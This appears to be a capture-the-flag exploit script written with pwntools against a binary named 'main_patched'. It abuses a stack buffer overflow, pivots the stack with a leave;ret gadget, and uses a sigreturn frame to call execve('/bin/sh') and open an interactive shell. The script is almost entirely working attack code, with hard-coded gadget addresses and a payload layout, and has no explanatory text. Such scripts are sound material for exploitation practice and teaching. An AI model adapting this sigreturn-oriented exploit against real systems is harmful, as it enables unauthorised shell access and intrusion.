#!/usr/bin/env python3

from pwn import *

exe = ELF('main_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda p, data: p.send(data)
sa = lambda p, msg, data: p.sendafter(msg, data)
sl = lambda p, data: p.sendline(data)
sla = lambda p, msg, data: p.sendlineafter(msg, data)
sn = lambda p, num: p.send(str(num).encode())
sna = lambda p, msg, num: p.sendafter(msg, str(num).encode())
sln = lambda p, num: p.sendline(str(num).encode())
slna = lambda p, msg, num: p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* main+62

        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()
'''
   0x00000000004011a2 <+31>:    lea    rax,[rbp-0x100]
   0x00000000004011a9 <+38>:    mov    edx,0x110
   0x00000000004011ae <+43>:    mov    rsi,rax
   0x00000000004011b1 <+46>:    mov    edi,0x0
   0x00000000004011b6 <+51>:    call   0x401050 <read@plt>
'''

buffer = 0x404000 + 0x500
cmd = b'/bin/sh\x00'
syscall = 0x40117c
read = 0x4011a2

p.send(b'A'*(264-8) + p64(buffer) + p64(read))
frame = SigreturnFrame()
frame.rax = 59
frame.rdi = buffer - 0x200
frame.rsi = 0
frame.rdx = 0
frame.rsp = buffer + 0x400
frame.rbp = 0
frame.rip = syscall

ret = 0x401016
leave_ret = 0x4011c0
main = 0x401183

f = bytes(frame)
print(f)
print(len(f))

read_plt = 0x401050


payload = p64(main) + p64(read_plt) + p64(syscall) + f[0:29*8] + p64(buffer-0x100-8) + p64(leave_ret)

time.sleep(1)
p.send(payload)
time.sleep(1)
p.sendline(b'/bin/sh\x00123456')
time.sleep(1)
p.sendline(b'/bin/sh\x00123456')
time.sleep(1)


p.interactive()
